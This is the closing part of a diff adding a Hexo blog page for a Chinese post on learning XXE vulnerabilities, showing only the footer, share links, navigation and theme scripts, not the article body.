+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Note/">Note</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://hu5k7.github.io/2019/12/03/xxe/&title=《XXE漏洞学习》 — Hu5k7's Blog&pic=https://hu5k7.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://hu5k7.github.io/2019/12/03/xxe/&title=《XXE漏洞学习》 — Hu5k7's Blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://hu5k7.github.io/2019/12/03/xxe/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《XXE漏洞学习》 — Hu5k7's Blog&url=https://hu5k7.github.io/2019/12/03/xxe/&via=https://hu5k7.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://hu5k7.github.io/2019/12/03/xxe/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/11/06/BugkuCTF逆向/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">BugkuCTF逆向</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+            <span>This blog is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Hu5k7 &copy; 2017 - 2019</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://hu5k7.github.io/2019/12/03/xxe/&title=《XXE漏洞学习》 — Hu5k7's Blog&pic=https://hu5k7.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://hu5k7.github.io/2019/12/03/xxe/&title=《XXE漏洞学习》 — Hu5k7's Blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://hu5k7.github.io/2019/12/03/xxe/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《XXE漏洞学习》 — Hu5k7's Blog&url=https://hu5k7.github.io/2019/12/03/xxe/&via=https://hu5k7.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://hu5k7.github.io/2019/12/03/xxe/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://hu5k7.github.io/2019/12/03/xxe/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"right","width":200,"height":350},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
